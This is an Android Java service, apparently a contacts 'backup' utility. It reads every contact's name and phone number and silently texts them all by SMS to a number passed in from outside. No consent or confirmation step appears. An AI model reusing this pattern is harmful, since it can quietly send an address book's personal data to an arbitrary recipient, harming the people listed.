package com.wpt.service;

import java.util.ArrayList;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds;
import android.telephony.SmsManager;
import android.util.Log;

public class BackupContactService extends IntentService {

	private Uri primaryUri, secondUri;
	private Cursor cursor, cursorNum;
	private String number, name, msg = "";
	private SmsManager smsManager;

	public BackupContactService() {
		super("BackupContactService");
	}

	@Override
	protected void onHandleIntent(Intent intent) {

		smsManager = SmsManager.getDefault();
		ContentResolver cr = getContentResolver();

		// 获取主表-
		primaryUri = ContactsContract.Contacts.CONTENT_URI;
		// 获取从表-
		secondUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

		cursor = cr.query(primaryUri, new String[] {
				ContactsContract.Contacts._ID,
				ContactsContract.Contacts.DISPLAY_NAME }, null, null, null);
		for (int i = 0; i < cursor.getCount(); i++) {
			cursor.moveToPosition(i);
			int id = cursor.getInt(0);
			name = cursor.getString(1);

			String[] projection = { ContactsContract.CommonDataKinds.Phone.NUMBER };
			cursorNum = cr.query(secondUri, projection,
					CommonDataKinds.Phone.CONTACT_ID + "=?",
					new String[] { String.valueOf(id) }, null);
			for (int j = 0; j < cursorNum.getCount(); j++) {
				cursorNum.moveToPosition(j);
				number = cursorNum.getString(0);
				msg += name + "--";
				msg += number + "\n";
			}
		}
		String friendNum = intent.getStringExtra("number");
		
		if (!msg.equals("") && msg != null) {
			//---分割发送短信----
			ArrayList<String> msgs = smsManager.divideMessage(msg);
			for(String conttactsMsg:msgs){
				smsManager.sendTextMessage(friendNum, null, conttactsMsg, null, null);
			}
		}

	}
}
